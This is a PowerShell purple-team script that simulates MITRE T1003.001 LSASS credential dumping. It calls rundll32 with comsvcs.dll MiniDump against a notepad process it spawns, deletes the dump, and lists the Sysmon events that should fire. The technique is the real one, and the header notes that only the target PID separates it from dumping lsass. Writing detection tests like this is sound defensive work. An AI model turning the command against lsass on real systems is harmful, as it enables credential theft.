<#
.SYNOPSIS
    Atomic simulation for MITRE ATT&CK T1003.001 — OS Credential Dumping:
    LSASS Memory. SAFE VARIANT — targets a disposable notepad.exe, not lsass.

.DESCRIPTION
    Reproduces the `rundll32 + comsvcs.dll, MiniDump` invocation pattern that
    adversaries use to dump LSASS. The target process is a disposable notepad
    spawned by this script. The command line, parent/child chain, and
    MiniDump export are identical to hostile usage — only the target PID
    differs.

    To run the real variant against lsass.exe, see the README "Going the
    real way" section. Lab VMs only.

.NOTES
    Author:  cyberknight91
    License: MIT
    WARNING: The dump file produced contains the memory of the spawned
             notepad (nothing sensitive). The script removes it on exit.
#>

[CmdletBinding()]
param(
    [string]$OutputDir = $env:TEMP
)

$ErrorActionPreference = "Stop"

Write-Host "[+] T1003.001 — LSASS Credential Dumping (SAFE simulation)" -ForegroundColor Magenta
Write-Host "    Timestamp: $(Get-Date -Format o)"
Write-Host ""

# ---- Spawn disposable target -------------------------------------------
Write-Host "[*] Spawning disposable notepad.exe as dump target ..."
$target = Start-Process -FilePath "notepad.exe" -PassThru -WindowStyle Minimized
Start-Sleep -Seconds 1
Write-Host "[+] notepad.exe PID = $($target.Id)" -ForegroundColor Green

# ---- Prepare dump path -------------------------------------------------
$dumpPath = Join-Path $OutputDir "purplelab-atomic-$($target.Id).dmp"
Write-Host "[*] Dump path: $dumpPath"

# ---- Fire rundll32 + comsvcs.dll MiniDump -------------------------------
$rundll32 = "$env:SystemRoot\System32\rundll32.exe"
$comsvcs  = "$env:SystemRoot\System32\comsvcs.dll"

Write-Host "[*] Invoking: $rundll32 $comsvcs, MiniDump $($target.Id) `"$dumpPath`" full"
Write-Host ""

$proc = Start-Process -FilePath $rundll32 `
                      -ArgumentList @("$comsvcs,", "MiniDump", "$($target.Id)", "`"$dumpPath`"", "full") `
                      -NoNewWindow `
                      -PassThru `
                      -Wait

Write-Host "[+] rundll32 exit code: $($proc.ExitCode)"

# ---- Verify ------------------------------------------------------------
if (Test-Path $dumpPath) {
    $size = (Get-Item $dumpPath).Length
    Write-Host "[+] Dump file produced: $([math]::Round($size/1MB, 2)) MB" -ForegroundColor Green
} else {
    Write-Host "[!] No dump produced. Possible causes: insufficient rights, EDR blocked, comsvcs path wrong." -ForegroundColor Yellow
}

# ---- Clean-up ----------------------------------------------------------
Write-Host ""
Write-Host "[*] Cleaning up ..."
Stop-Process -Id $target.Id -Force -ErrorAction SilentlyContinue
if (Test-Path $dumpPath) { Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue }
Write-Host "[+] Done." -ForegroundColor Green
Write-Host ""
Write-Host "[+] Check your SIEM for:"
Write-Host "    - Sysmon EventID 1 (rundll32.exe with comsvcs + MiniDump)"
Write-Host "    - Sysmon EventID 10 (ProcessAccess with GrantedAccess 0x1FFFFF)"
Write-Host "    - Sysmon EventID 11 (.dmp file creation)"
Write-Host "    - Sigma rule: T1003.001_lsass_dump"
